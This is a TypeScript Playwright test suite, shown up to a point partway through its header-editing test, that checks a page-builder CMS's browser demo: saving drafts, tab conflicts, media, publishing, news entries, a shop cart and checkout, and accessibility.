// The browser demo's story, on its build as GitHub Pages serves it, each
// test a first visit in a browser of its own:
// - the example site is there, its five pages published, the home page
//   open, and the demo's line at the bottom, word for word, who made it a
//   link to the author's site;
// - the line's key shuts it down to who made it and opens it again, the
//   browser keeping the choice under the editor and under the pages the
//   demo draws; on a phone, shut, it is one row a finger's height and the
//   canvas takes the room;
// - an edit is kept in this browser and is there after a reload;
// - two tabs: the one that saves second gets the conflict bar, and Reload
//   takes the other's words;
// - an image goes into the library beside the example site's fifteen;
// - Publish opens the page as published in a new tab, with its line; its
//   form says what the full system does instead of sending; a link to the
//   site's other page opens it as the demo draws it; Preview shows the
//   draft;
// - the example site's News: an entry's View in Collections opens the
//   entry as the demo draws it; its template changed and published here;
//   the news page, reached from the footer of the home page as published,
//   lists the entries newest first, and a card opens the entry's page as
//   the demo draws it, with the change, and the way back to all the news;
// - the example site's shop: its page, reached from the footer, lists the
//   products with their prices; a product's Add to cart puts it in the
//   cart this browser keeps, which is there after a reload and draws as
//   the CMS's /cart does; a quantity changed; Checkout makes the demo's
//   order, says what the full system does, and the cart loses what it
//   took; the order is in the Shop screen's Orders, the demo's;
// - the header and footer changed from their panel, opened by a click on
//   the canvas's header: the canvas draws them as they are typed; saved,
//   the pages published in this browser show them with nothing published
//   again, and so does the preview; after a reload they are still there;
// - the screens promise nothing only the full system does (a visitor, a
//   live page, a server), the Shop's included, and the notice that says
//   how Publish went can be closed from the keyboard without losing the
//   place;
// - axe on each screen, with no serious finding;
// - a visitor back after a newer edition of the example site is given it
//   at once if nothing was changed here, and offered it otherwise, the
//   changes kept until they choose;
// - the page's Content-Security-Policy refuses a connection anywhere but
//   its own site and the Assistant's two providers;
// - and no request leaves the demo's own path: no CMS, no other site.
// With DEMO_SHOTS set to a folder, each screen is photographed there.
import { join } from "node:path";
import { test as base, expect, type BrowserContext, type Locator, type Page } from "@playwright/test";
import { DEMO_BASE } from "../../build/demo.ts";
import { axe } from "../helpers/axe.ts";
import { block } from "../helpers/canvas.ts";
import { saveState } from "../helpers/heading.ts";
import { png } from "../helpers/images.ts";

const LINE = "Browser demo: drafts stay in this browser. The full CMS runs on Rails 8, with publishing, shared versions and caching. Source on GitHub. Developed by Riccardo Sapuppo";
const SOURCE = "https://github.com/riccardosapuppo/page-builder-cms";
const AUTHOR = "https://riccardosapuppo.com";
const CREDIT = "Developed by Riccardo Sapuppo";
const PUBLISHED_LINE = "Published in this browser. In the full system, Rails publishes and serves this page, with the cache.";
const PREVIEW_LINE = "The draft, as it would be published. In the full system, Rails draws this preview and never stores it.";
const FORM_LINE = "In the full system, Rails keeps these answers for the CMS's Form responses.";
const FORM_NOT_SENT = "Not sent: in the full system, Rails keeps these answers for the CMS's Form responses.";
const PART_LINE = "Publish puts it on every page shown in this browser.";

// The example site's pages as a first visit numbers them: the templates
// of News and Club kit first, each made with its collection, then the
// pages in site.json's order.
const HOME = 3;
const WINTER = 4;
const NEWS = 5;
const SHOP = 6;
const NOTICES = 7;
// News's entries, newest first, as its list orders them.
const NEWS_TITLES = ["The winter series starts on 1 November", "A rockpool morning for children", "Tea in the hut on Sundays", "Bright caps for the dark mornings", "The autumn tide times are up by the door"];

// Every page of the context held to no error, in it or in its console, and
// to no request off the demo's own path.
async function watch(context: BrowserContext, own: string): Promise<string[]> {
  const errors: string[] = [];
  const listen = (page: Page) => {
    page.on("pageerror", (error) => errors.push(`${page.url()}: ${error.message}`));
    page.on("console", (message) => {
      if (message.type() === "error") errors.push(`${page.url()}: ${message.text()}`);
    });
  };
  context.pages().forEach(listen);
  context.on("page", listen);
  await context.route("**/*", async (route) => {
    const url = route.request().url();
    if (url.startsWith(own) || url.startsWith("blob:") || url.startsWith("data:")) return route.fallback();
    errors.push(`request off the demo's path: ${url}`);
    return route.abort();
  });
  return errors;
}

const test = base.extend<{ quiet: void }>({
  quiet: [async ({ context, baseURL }, use) => {
    const errors = await watch(context, `${baseURL}${DEMO_BASE}`);
    await use();
    expect(errors).toEqual([]);
  }, { auto: true }],
});

async function shoot(page: Page, name: string): Promise<void> {
  const folder = process.env.DEMO_SHOTS;
  if (folder) await page.screenshot({ path: join(folder, `${name}.png`) });
}

async function noSeriousFinding(page: Page, where: string): Promise<void> {
  const report = await axe(page);
  if (report.other.length > 0) console.log(`axe, ${where}, below serious:\n  ${report.other.join("\n  ")}`);
  expect(report.passes, `axe ran on ${where}`).toBeGreaterThan(10);
  expect(report.serious, `axe on ${where}`).toEqual([]);
}

// The editor, open on the example site's home page.
async function openDemo(page: Page): Promise<void> {
  await page.goto(DEMO_BASE);
  await expect(page.getByRole("button", { name: "Switch page. Open: Slack Water" })).toBeVisible({ timeout: 30_000 });
  await expect(page.locator(".canvas .frame")).toBeVisible();
  await expect(block(page, "hero-heading")).toBeVisible();
}

const heroWords = (page: Page) => block(page, "hero-heading").getByRole("heading");

async function retitleHero(page: Page, words: string): Promise<void> {
  await block(page, "hero-heading").click();
  const text = page.getByRole("textbox", { name: "Text" });
  await text.fill(words);
  await text.blur();
}

const saved = (page: Page) => expect(saveState(page)).toHaveText("Saved");

// The editor's one sentence about what just happened.
const notice = (page: Page) => page.locator(".notice");

test("a first visit opens the example site: five pages, the header and footer and the templates of its two collections, all published, the home page open, and the demo's line at the bottom", async ({ page }) => {
  await openDemo(page);
  await page.getByRole("button", { name: "Switch page. Open: Slack Water" }).click();
  const pages = page.getByRole("dialog", { name: "Pages" });
  await expect(pages.locator(".page-row")).toHaveText(["Slack Water/Published", "Winter series/winter-seriesPublished", "News/newsPublished", "Shop/shopPublished", "Notices/noticesPublished", "HeaderEvery pagePublished", "FooterEvery pagePublished", "NewsEvery entryPublished", "Club kitEvery entryPublished"]);
  await expect(pages.getByRole("list", { name: "Templates" }).locator(".page-row")).toHaveCount(2);
  await shoot(page, "demo-pages");
  await page.keyboard.press("Escape");

  const line = page.getByRole("complementary", { name: "About this demo" });
  await expect(line).toHaveText(LINE);
  await expect(line.getByRole("link", { name: "Source on GitHub" })).toHaveAttribute("href", SOURCE);
  await expect(line.getByRole("link", { name: CREDIT })).toHaveAttribute("href", AUTHOR);
  // At the bottom, under the editor's bottom line, not at the top.
  const own = (await line.boundingBox())!;
  const bottomLine = (await page.locator(".statusbar").boundingBox())!;
  expect(own.y).toBeGreaterThanOrEqual(bottomLine.y + bottomLine.height - 4);
  expect(own.y + own.height).toBeLessThanOrEqual(900);

  // What this storage cannot do has no control: no Schedule, no Form
  // responses; and no address names the CMS.
  await page.getByRole("button", { name: "Page Builder CMS menu" }).click();
  await expect(page.getByRole("menu", { name: "Page Builder CMS" }).getByRole("menuitem", { name: "Media library" })).toBeVisible();
  await expect(page.getByRole("menuitem", { name: "Form responses" })).toHaveCount(0);
  await page.keyboard.press("Escape");
  await page.getByRole("button", { name: "More publish options" }).click();
  const options = page.getByRole("menu", { name: "Publish options" });
  await expect(options.getByRole("menuitem")).toHaveText([/^Publish now/, /^View published page/]);
  await page.keyboard.press("Escape");
  expect(await page.locator("body").innerText()).not.toContain("127.0.0.1:3900");

  await shoot(page, "demo-editor");
  await noSeriousFinding(page, "the editor on the example site");
});

// Where an element stands, to the pixel.
async function box(locator: Locator) {
  const b = (await locator.boundingBox())!;
  return { left: Math.round(b.x), top: Math.round(b.y), right: Math.round(b.x + b.width), bottom: Math.round(b.y + b.height), width: Math.round(b.width), height: Math.round(b.height) };
}

test("the demo's line shuts down to who made it with its key, and opens again; the browser keeps the choice, under the editor and under the pages the demo draws", async ({ page, context }) => {
  await openDemo(page);
  const line = page.getByRole("complementary", { name: "About this demo" });
  const key = line.getByRole("button", { name: "About this demo" });
  const author = line.getByRole("link", { name: CREDIT });
  await expect(key).toHaveAttribute("aria-expanded", "true");
  const open = await box(line);
  const credit = await box(author);
  // From the keyboard as from a pointer, the focus kept on the key.
  await key.focus();
  await page.keyboard.press("Enter");
  await expect(line).toHaveText(CREDIT);
  await expect(key).toHaveAttribute("aria-expanded", "false");
  await expect(key).toBeFocused();
  // At the window's foot still, who made it where it was, on the right.
  const shut = await box(line);
  expect(shut.bottom).toBe(open.bottom);
  expect((await box(author)).right).toBe(credit.right);
  await expect(author).toHaveAttribute("href", AUTHOR);
  await shoot(page, "demo-line-shut");
  await noSeriousFinding(page, "the demo's line shut");

  // Shut on the next visit, and under a page the demo draws; opened there,
  // open again under the editor on the visit after.
  await page.reload();
  await openDemo(page);
  await expect(line).toHaveText(CREDIT);
  const view = await context.newPage();
  await view.goto(`${DEMO_BASE}?published=${HOME}`);
  const viewLine = view.getByRole("complementary", { name: "About this demo" });
  await expect(viewLine).toHaveText(CREDIT);
  await viewLine.getByRole("button", { name: "About this demo" }).click();
  await expect(viewLine).toHaveText(LINE);
  await view.close();
  await page.reload();
  await openDemo(page);
  await expect(line).toHaveText(LINE);
  await expect(key).toHaveAttribute("aria-expanded", "true");
});

test.describe("on a phone, 390 by 844, with a finger", () => {
  test.use({ viewport: { width: 390, height: 844 }, hasTouch: true, isMobile: true });

  test("the demo's line, shut with its key, is one row a finger's height between the canvas and the bar at the foot, and the canvas takes the room it gave", async ({ page }) => {
    await openDemo(page);
    const line = page.getByRole("complementary", { name: "About this demo" });
    const key = line.getByRole("button", { name: "About this demo" });
    const canvas = page.locator(".canvas");
    const keyBox = await box(key);
    expect([keyBox.width, keyBox.height]).toEqual([44, 44]);
    const open = await box(line);
    const canvasOpen = await box(canvas);
    await key.tap();
    await expect(line).toHaveText(CREDIT);
    const shut = await box(line);
    expect(shut.height).toBe(44);
    expect(shut.height).toBeLessThan(open.height);
    expect(shut.bottom).toBe((await box(page.getByRole("navigation", { name: "Editor tools" }))).top);
    const canvasShut = await box(canvas);
    expect(canvasShut.height).toBe(canvasOpen.height + open.height - shut.height);
    expect(canvasShut.bottom).toBe(shut.top);
    await expect(line.getByRole("link", { name: CREDIT })).toHaveAttribute("href", AUTHOR);
    await noSeriousFinding(page, "a phone, the demo's line shut");
  });
});

// The edition this browser was given, as the demo keeps it.
const EDITION = "page-builder-cms:example-site-edition";
const pageIds = (page: Page) => page.evaluate(() => new Promise<number[]>((done, fail) => {
  const asked = indexedDB.open("page-builder-cms");
  asked.onerror = () => fail(asked.error);
  asked.onsuccess = () => {
    const keys = asked.result.transaction("pages").objectStore("pages").getAllKeys();
    keys.onerror = () => fail(keys.error);
    keys.onsuccess = () => {
      done((keys.result as number[]).slice().sort((a, b) => a - b));
      asked.result.close();
    };
  };
}));
// As if this browser had been given an older edition of the example site.
const olderEdition = (page: Page) => page.evaluate((key) => {
  const record = JSON.parse(localStorage.getItem(key)!) as { edition: string; fingerprint: string };
  localStorage.setItem(key, JSON.stringify({ ...record, edition: "00000000" }));
}, EDITION);

test("a visitor back after a newer edition of the example site gets it at once if nothing was changed here; with something changed, it is offered, and the changes kept until they choose", async ({ page }) => {
  await openDemo(page);
  const given = (await page.evaluate((key) => JSON.parse(localStorage.getItem(key) ?? "null"), EDITION)) as { edition: string } | null;
  expect(given?.edition).toMatch(/^[0-9a-f]{8}$/);
  const before = await pageIds(page);

  // Nothing changed here: the new edition at once, put in anew.
  await olderEdition(page);
  await page.reload();
  await openDemo(page);
  await expect.poll(() => page.evaluate((key) => (JSON.parse(localStorage.getItem(key)!) as { edition: string }).edition, EDITION)).toBe(given!.edition);
  expect((await pageIds(page)).some((id) => before.includes(id))).toBe(false);
  const line = page.getByRole("complementary", { name: "About this demo" });
  await expect(line).toHaveText(LINE);

  // Something changed here: kept, and the new edition offered.
  await retitleHero(page, "Swim when the bay is still");
  await saved(page);
  await olderEdition(page);
  await page.reload();
  await openDemo(page);
  await expect(heroWords(page)).toHaveText("Swim when the bay is still");
  await expect(line).toContainText("A newer example site is out; this browser kept the pages you changed.");
  await noSeriousFinding(page, "the offer of a newer example site");
  await line.getByRole("button", { name: "Start over with it" }).click();
  await expect(line).toContainText("Start over with the new example site? The pages you changed in this browser are replaced.");
  // Asked twice: Keep my pages goes back, and nothing is lost.
  await line.getByRole("button", { name: "Keep my pages" }).click();
  await expect(heroWords(page)).toHaveText("Swim when the bay is still");
  await line.getByRole("button", { name: "Start over with it" }).click();
  await line.getByRole("button", { name: "Start over", exact: true }).click();
  // The page loads again, given the example site as this build has it.
  await expect(heroWords(page)).toHaveText("Swim at slack water", { timeout: 30_000 });
  await expect(line).toHaveText(LINE);
});

test("an edit is kept in this browser, and is there after a reload", async ({ page }) => {
  await openDemo(page);
  await retitleHero(page, "Words kept in this browser");
  await saved(page);
  await page.reload();
  await expect(heroWords(page)).toHaveText("Words kept in this browser", { timeout: 30_000 });
  await expect(saveState(page)).toHaveText("Saved");
});

test("two tabs: the one that saves second gets the conflict bar, and Reload takes the other's words", async ({ page: first, context }) => {
  await openDemo(first);
  const second = await context.newPage();
  await openDemo(second);

  await retitleHero(first, "Words from the first tab");
  await saved(first);
  await retitleHero(second, "Words from the second tab");
  const banner = second.getByRole("alert");
  await expect(banner).toContainText("Changed in another tab. This page was saved in another tab after you opened it. Saving is paused until you choose.");
  await expect(banner.getByRole("button", { name: "Reload" })).toHaveAttribute("title", "Take the page as it is saved in this browser; Undo brings this tab's page back");
  await shoot(second, "demo-conflict");
  await noSeriousFinding(second, "the conflict bar");

  await banner.getByRole("button", { name: "Reload" }).click();
  await expect(banner).toHaveCount(0);
  await expect(heroWords(second)).toHaveText("Words from the first tab");
  await expect(notice(second)).toContainText("Reloaded: this is the page as it is saved in this browser.");
  await retitleHero(second, "The second tab, after reloading");
  await saved(second);
  await first.reload();
  await expect(heroWords(first)).toHaveText("The second tab, after reloading", { timeout: 30_000 });
});

test("an image goes into the library from this browser, beside the example site's fifteen", async ({ page }) => {
  await openDemo(page);
  await page.getByRole("button", { name: "Page Builder CMS menu" }).click();
  await page.getByRole("menuitem", { name: "Media library" }).click();
  const dialog = page.getByRole("dialog", { name: "Media library" });
  const images = dialog.getByRole("radiogroup", { name: "Images" }).getByRole("radio");
  await expect(images).toHaveCount(15);
  await expect(dialog.getByRole("radio", { name: /^hero-dawn\.png, / })).toBeVisible();
  await expect(dialog).toContainText("This browser keeps no smaller copies of them");

  await dialog.getByLabel("Images to upload").setInputFiles({ name: "harbour-wall.png", mimeType: "image/png", buffer: png(1200, 800, (x) => (x < 600 ? [30, 110, 90] : [230, 200, 140])) });
  const tile = dialog.getByRole("radio", { name: "harbour-wall.png, no alt text" });
  await expect(tile).toBeVisible({ timeout: 30_000 });
  await expect.poll(() => tile.locator("img").evaluate((img: HTMLImageElement) => img.complete && img.naturalWidth)).toBe(1200);
  await expect(images).toHaveCount(16);
  await shoot(page, "demo-library");
  await noSeriousFinding(page, "the media library");

  await page.reload();
  await page.getByRole("button", { name: "Page Builder CMS menu" }).click();
  await page.getByRole("menuitem", { name: "Media library" }).click();
  await expect(page.getByRole("dialog", { name: "Media library" }).getByRole("radio", { name: "harbour-wall.png, no alt text" })).toBeVisible();
});

test("Publish opens the page as published, with its line; the form says what the full system does; Preview shows the draft", async ({ page, context, baseURL }) => {
  await openDemo(page);
  await retitleHero(page, "Swim when the tide stands still");
  await saved(page);

  const opened = context.waitForEvent("page");
  await page.getByRole("button", { name: "Publish", exact: true }).click();
  const view = await opened;
  await view.waitForURL(`${baseURL}${DEMO_BASE}?published=${HOME}`);
  await expect(view.getByRole("complementary", { name: "About this page" })).toHaveText(PUBLISHED_LINE);
  await expect(view.getByRole("heading", { level: 1, name: "Swim when the tide stands still" })).toBeVisible();
  await expect(view).toHaveTitle("Slack Water");
  await expect(notice(page)).toContainText(PUBLISHED_LINE);
  await expect(page.getByRole("link", { name: "View published page" })).toHaveAttribute("href", `${baseURL}${DEMO_BASE}?published=${HOME}`);
  // The demo's line under the page too.
  await expect(view.getByRole("complementary", { name: "About this demo" })).toHaveText(LINE);
  // The pictures come from the browser's library.
  const hero = view.locator("main img").first();
  await expect.poll(() => hero.evaluate((img: HTMLImageElement) => img.complete && img.naturalWidth > 0 && img.src.startsWith("blob:"))).toBe(true);
  await shoot(view, "demo-published");
  await noSeriousFinding(view, "the page as published");

  // The form: a line instead of a send that goes nowhere.
  const form = view.locator(".w-form");
  await expect(form.getByRole("status")).toHaveText(FORM_LINE);
  await form.getByRole("checkbox", { name: "I can swim 200 meters without stopping" }).check();
  await form.getByRole("button", { name: "Send request" }).click();
  await expect(form.getByRole("status")).toHaveText(FORM_NOT_SENT);
  await expect(view).toHaveURL(`${baseURL}${DEMO_BASE}?published=${HOME}`);
  await form.scrollIntoViewIfNeeded();
  await shoot(view, "demo-form");

  // The site's links: the header's to a section of the page shown, the
  // winter series' back to the home page, each as the demo draws it.
  await view.getByRole("navigation", { name: "Main" }).getByRole("link", { name: "Questions" }).first().click();
  await view.waitForURL(`${baseURL}${DEMO_BASE}?published=${HOME}#questions`);
  await view.goto(`${DEMO_BASE}?published=${WINTER}`);
  await expect(view.getByRole("heading", { level: 1, name: "Winter series" })).toBeVisible();
  await view.getByRole("link", { name: "Back to the club" }).click();
  await view.waitForURL(`${baseURL}${DEMO_BASE}?published=${HOME}`);
  await expect(view.getByRole("heading", { level: 1, name: "Swim when the tide stands still" })).toBeVisible();

  // Preview: the draft, in a tab of its own.
  await retitleHero(page, "A draft not published yet");
  await saved(page);
  const previewed = context.waitForEvent("page");
  await page.getByRole("link", { name: "Preview" }).click();
  const preview = await previewed;
  await preview.waitForURL(`${baseURL}${DEMO_BASE}?preview=${HOME}`);
  await expect(preview.getByRole("complementary", { name: "About this page" })).toHaveText(PREVIEW_LINE);
  await expect(preview.getByRole("heading", { level: 1, name: "A draft not published yet" })).toBeVisible();
  await shoot(preview, "demo-preview");
  await noSeriousFinding(preview, "the draft's preview");
});

test("the example site's News: an entry's View opens it as the demo draws it; its template changed and published here; the news page, from the home page's footer, lists the entries newest first, and a card opens the entry's page with the change", async ({ page, context, baseURL }) => {
  const found: string[] = [];
  await openDemo(page);
  const own = new URL(`${baseURL}${DEMO_BASE}`).pathname;
  const entryView = (url: URL) => url.pathname === own && /^\?entry=[1-9][0-9]*$/.test(url.search);
  const pageLine = (view: Page) => view.getByRole("complementary", { name: "About this page" });
  const entryLine = (slug: string) => `The entry as published in this browser. In the full system, Rails serves it at /news/${slug}, with the cache.`;

  // News in Collections, its five entries published as the example site
  // has them; an entry's View opens the demo's own drawing of it.
  await page.getByRole("button", { name: "Page Builder CMS menu" }).click();
  await page.getByRole("menuitem", { name: "Collections" }).click();
  const collections = page.getByRole("dialog", { name: "Collections" });
  const rows = collections.getByRole("table", { name: /^Entries of News/ }).locator("tbody tr");
  await expect(rows).toHaveCount(5);
  await expect(rows.filter({ hasText: "Published" })).toHaveCount(5);
  await promisesNothing(page, "News in Collections", found);
  await collections.getByRole("button", { name: "Edit Tea in the hut on Sundays" }).click();
  const form = collections.locator(".co-form");
  const view = form.getByRole("link", { name: "View", exact: true });
  await expect(view).toHaveAttribute("href", new RegExp(`${own.replaceAll("/", "\\/")}\\?entry=[1-9][0-9]*$`));
  await expect(view).toHaveAttribute("title", "The entry as published in this browser. Opens in a new tab.");
  await promisesNothing(page, "an entry's form", found);
  const viewed = context.waitForEvent("page");
  await view.click();
  const shown = await viewed;
  await shown.waitForURL(entryView);
  await expect(pageLine(shown)).toHaveText(entryLine("tea-in-the-hut"));
  await expect(shown.getByRole("heading", { level: 1 })).toHaveText("Tea in the hut on Sundays");
  await shown.close();

  // Its template, from the settings, drawn with the newest entry: the
  // band of the others renamed, saved and published here.
  await form.getByRole("button", { name: "All entries" }).click();
  await collections.getByRole("tab", { name: "Settings" }).click();
  await collections.getByRole("button", { name: "Edit the template", exact: true }).click();
  await expect(page.getByRole("button", { name: "Switch page. Open: News" })).toBeVisible();
  await expect(block(page, "entry-title").locator("h1")).toHaveText(NEWS_TITLES[0]!);
  await block(page, "more-heading").click();
  const words = page.getByRole("textbox", { name: "Text" });
  await words.fill("More from the slipway");
  await words.blur();
  await saved(page);
  const sidebar = page.getByRole("complementary", { name: "Settings" });
  await sidebar.getByRole("tab", { name: "Page" }).click();
  await promisesNothing(page, "the template's Page tab", found);
  await page.getByRole("button", { name: "Publish", exact: true }).click();
  await expect(notice(page)).toContainText("Published in this browser. In the full system, every entry of News is drawn with this template.");
  await promisesNothing(page, "the notice after the template's publish", found);

  // The news page, at the collection's prefix: its list, newest first,
  // and its panel.
  await sidebar.getByRole("button", { name: "Back to Slack Water" }).click();
  await page.getByRole("button", { name: "Switch page. Open: Slack Water" }).click();
  await page.getByRole("dialog", { name: "Pages" }).getByRole("list", { name: "The site's pages" }).getByRole("button", { name: /^News/ }).click();
  await expect(page.getByRole("button", { name: "Switch page. Open: News" })).toBeVisible();
  await expect(block(page, "entries-list").locator(".sw-entry-title")).toHaveText(NEWS_TITLES);
  await block(page, "entries-list").click();
  await promisesNothing(page, "the Collection list's panel", found);

  // As published here: the home page's footer leads to the news, the
  // news's first card to its entry, drawn with the template as just
  // published, the others below it, and its last button back.
  const visit = await context.newPage();
  await visit.goto(`${DEMO_BASE}?published=${HOME}`);
  await visit.locator("footer").getByRole("link", { name: "News", exact: true }).click();
  await visit.waitForURL(`${baseURL}${DEMO_BASE}?published=${NEWS}`);
  await expect(visit.getByRole("heading", { level: 1, name: "News" })).toBeVisible();
  const cards = visit.locator('[data-block-id="entries-list"] .sw-entry-title a');
  await expect(cards).toHaveText(NEWS_TITLES);
  await expect(cards.first()).toHaveAttribute("href", /^\?entry=[1-9][0-9]*$/);
  await shoot(visit, "demo-news");
  await noSeriousFinding(visit, "the news page");
  await cards.first().click();
  await visit.waitForURL(entryView);
  await expect(pageLine(visit)).toHaveText(entryLine("winter-series-starts"));
  await expect(visit.locator('[data-block-type="field"] h1')).toHaveText(NEWS_TITLES[0]!);
  await expect(visit).toHaveTitle(NEWS_TITLES[0]!);
  await expect(visit.getByRole("heading", { level: 2, name: "More from the slipway" })).toBeVisible();
  await expect(visit.locator('[data-block-id="more-list"] .sw-entry-title a')).toHaveText(NEWS_TITLES.slice(1, 3));
  await shoot(visit, "demo-entry");
  await noSeriousFinding(visit, "an entry's page");
  await visit.getByRole("link", { name: "All the news" }).click();
  await visit.waitForURL(`${baseURL}${DEMO_BASE}?published=${NEWS}`);
  expect(found, "what the screens say that only the full system does").toEqual([]);
});

test("the example site's shop in this browser: a product put in the cart from its page, the cart kept after a reload, a quantity changed; Checkout makes the demo's order, says what the full system does, and the order is in the Shop screen's Orders", async ({ page, context, baseURL }) => {
  const found: string[] = [];
  await openDemo(page);
  const own = `${baseURL}${DEMO_BASE}`;
  const pageLine = (view: Page) => view.getByRole("complementary", { name: "About this page" }).locator("p").first();

  // The shop's page, reached from the home page's footer, lists the four
  // products with their prices; a card opens the product's page.
  const visit = await context.newPage();
  await visit.goto(`${DEMO_BASE}?published=${HOME}`);
  await visit.locator("footer").getByRole("link", { name: "Shop", exact: true }).click();
  await visit.waitForURL(`${own}?published=${SHOP}`);
  await expect(visit.locator('[data-block-id="kit-list"] .sw-entry-price')).toHaveText(["£9.50", "£12.00", "£24.00", "£25.00"]);
  await visit.locator('[data-block-id="kit-list"]').getByRole("link", { name: "Swim cap" }).click();
  await visit.waitForURL(/\?entry=[1-9][0-9]*$/);
  await expect(visit.locator('[data-block-id="product-price"]')).toHaveText("£12.00");

  // Add to cart: the cart this browser keeps, drawn as the CMS draws /cart,
  // under the line saying what the full system does.
  await visit.getByRole("spinbutton", { name: "Quantity" }).fill("2");
  await visit.getByRole("button", { name: "Add to cart" }).click();
  await visit.waitForURL(`${own}?cart`);
  await expect(pageLine(visit)).toHaveText("The cart, kept in this browser. In the full system, Rails keeps a visitor's cart in a cookie of its own and serves it at /cart, and Checkout goes to Stripe's checkout, in its test mode.");
  await expect(visit.getByRole("heading", { level: 1, name: "Your cart" })).toBeVisible();
  await expect(visit.locator(".sw-cart-line .sw-cart-title")).toHaveText(["Swim cap"]);
  await expect(visit.locator(".sw-cart-picture img")).toHaveAttribute("src", /^blob:/);
  await expect(visit).toHaveTitle("Your cart");
  await visit.reload();
  await expect(visit.locator(".sw-cart-amount")).toHaveText(["£24.00"]);
  await noSeriousFinding(visit, "the demo's cart");

  // How many, changed; the line's title leads back to its page.
  await visit.getByRole("spinbutton", { name: "Quantity of Swim cap" }).fill("3");
  await visit.getByRole("button", { name: "Update Swim cap" }).click();
  await expect(visit.locator(".sw-cart-total")).toHaveText("Total £36.00");
  await expect(visit.locator(".sw-cart-head p")).toHaveText("You have 3 items in your cart.");
  await shoot(visit, "demo-cart");

  // Checkout: the demo's order, and what the full system does instead.
  await visit.getByRole("button", { name: "Checkout" }).click();
  await visit.waitForURL(/\?order=[1-9][0-9]*$/);
  await expect(pageLine(visit)).toHaveText("An order made in this browser, and nothing was paid. In the full system, Rails sends the visitor to Stripe's checkout, in its test mode, and this page says the order is paid once Stripe does.");
  await expect(visit.getByRole("heading", { level: 1, name: "Order made" })).toBeVisible();
  await expect(visit.locator(".sw-cart-head p")).toHaveText("Not paid: browser demo. It is listed in the editor's Shop screen, under Orders.");
  await expect(visit.locator(".sw-order .sw-cart-price")).toHaveText(["3 × £12.00"]);
  await expect(visit.locator(".sw-cart-total")).toHaveText("Total £36.00");
  await shoot(visit, "demo-order");
  await noSeriousFinding(visit, "the demo's order");
  // The cart lost what the order took; the way back leads to the shop.
  await visit.getByRole("link", { name: "Back to the shop" }).click();
  await visit.waitForURL(`${own}?published=${SHOP}`);
  await visit.getByRole("link", { name: "See your cart" }).click();
  await visit.waitForURL(`${own}?cart`);
  await expect(visit.locator(".sw-cart-head p")).toHaveText("Your cart is empty.");

  // The editor's Shop screen lists the order, the demo's, as made here.
  await page.getByRole("button", { name: "Page Builder CMS menu" }).click();
  await page.getByRole("menuitem", { name: "Shop" }).click();
  const shop = page.getByRole("dialog", { name: "Shop" });
  await expect(shop.getByRole("button", { name: /^Settings, On, in pounds, from Club kit/ })).toBeVisible();
  await shop.getByRole("button", { name: /^Orders/ }).click();
  const row = shop.locator("tbody tr").first();
  await expect(row.locator(".shop-status")).toHaveText("Not paid: browser demo");
  await expect(row.locator(".shop-amount")).toHaveText("£36.00");
  await expect(row.locator(".shop-items")).toHaveText("3 items: Swim cap × 3");
  await promisesNothing(page, "the Shop's orders, with the demo's order", found);
  await shoot(page, "demo-shop-orders");
  expect(found, "what the screens say that only the full system does").toEqual([]);
});

// A click on what the selector finds, brought into view first: in its
// middle, or as far down from its top as given. The canvas's header and
// footer around a page, and the page around a part, are inert, so the
// click reaches the canvas, which opens the part or goes back to the page.
async function clickOn(page: Page, selector: string, fromTop?: number): Promise<void> {
  await page.locator(selector).evaluate((element, start) => element.scrollIntoView({ block: start ? "start" : "center" }), fromTop !== undefined);
  const box = (await page.locator(selector).boundingBox())!;
  await page.mouse.click(box.x + box.width / 2, fromTop === undefined ? box.y + box.height / 2 : box.y + fromTop);
}

// The header and footer as a page draws them: the canvas's, or those of a
// page the demo draws. The logo's name, the menu's links each with its
// address, and the footer's words, as the document holds them
// (textContent: no CSS casing).
async function partsOf(page: Page, around = { header: "header.sw-header", footer: "footer.sw-footer" }) {
  const text = (selector: string) => page.locator(selector).first().evaluate((element) => (element.textContent ?? "").replace(/\s+/g, " ").trim());
  return {
    name: await text(`${around.header} .w-logo-link span`),
    links: await page.locator(`${around.header} .w-menu-links a`).evaluateAll((links) => links.map((link) => [link.textContent, link.getAttribute("href")])),
    footer: await text(around.footer),
  };
}

const CANVAS = { header: '.canvas [data-theme-part="header"]', footer: '.canvas [data-theme-part="footer"]' };
// The header open on the canvas, and the footer locked under the page.
const EDITING = { header: '.canvas [data-editing-part="header"]', footer: '.canvas [data-theme-part="footer"]' };

test("the header, opened from the canvas, is edited as a page is, the page dimmed around it; published, every page published here shows it, the preview its draft, and a reload finds it kept", async ({ page, context, baseURL }) => {
  // What the example site starts with: the starter of cms/config/parts,
  // published by the seed.
  await openDemo(page);
  const before = await partsOf(page, CANVAS);
  expect(before.name).toBe("Slack Water");
  expect(before.links.map(([label]) => label)).toEqual(["Swims", "Winter series", "Gallery", "Meet us", "Questions"]);
  const changed = { ...before, name: "Eelgrass Bay", links: [...before.links, ["Notices", "/notices"]] };

  // A click on the header around the page opens it, the page dimmed and
  // locked around it, and the footer locked under that.
  await clickOn(page, CANVAS.header);
  await expect(page.getByRole("button", { name: "Switch page. Open: Header" })).toBeVisible();
  await expect(page.locator(EDITING.header)).toBeVisible();
  await expect(page.locator(".canvas [data-around-page]")).toBeVisible();
  await expect(page.locator(".canvas [data-around-page]")).toHaveAttribute("inert", "");

  // The logo's name and a link more, in their panels, drawn as typed.
  await block(page, "header-logo").click();
  const name = page.getByLabel("Site name");
  await name.fill(changed.name);
  await name.blur();
  await expect(page.locator(`${EDITING.header} .w-logo-link span`)).toHaveText(changed.name);
  await block(page, "header-menu").click();
  await page.getByRole("button", { name: "Add a link" }).click();
  const added = before.links.length + 1;
  await page.getByLabel(`Text ${added}`, { exact: true }).fill("Notices");
  await page.getByLabel(`Text ${added}`, { exact: true }).blur();
  await page.getByLabel(`Link ${added}`, { exact: true }).fill("/notices");
  await page.getByLabel(`Link ${added}`, { exact: true }).blur();
  await expect(page.locator(`${EDITING.header} .w-menu-links a`).last()).toHaveText("Notices");
  await saved(page);
  await shoot(page, "demo-header");
  await noSeriousFinding(page, "the header open in the editor");

  // Published: the home page as published, in a new tab, has it.
  const opened = context.waitForEvent("page");
  await page.getByRole("button", { name: "Publish", exact: true }).click();
  const view = await opened;
  await view.waitForURL(`${baseURL}${DEMO_BASE}?published=${HOME}`);
  await expect(view.getByRole("complementary", { name: "About this page" })).toHaveText(PUBLISHED_LINE);
  await expect(view.locator("header.sw-header .w-logo-link span")).toHaveText(changed.name);
  expect(await partsOf(view)).toEqual(changed);
  // The new link opens the notices as published, under the same header
  // and footer.
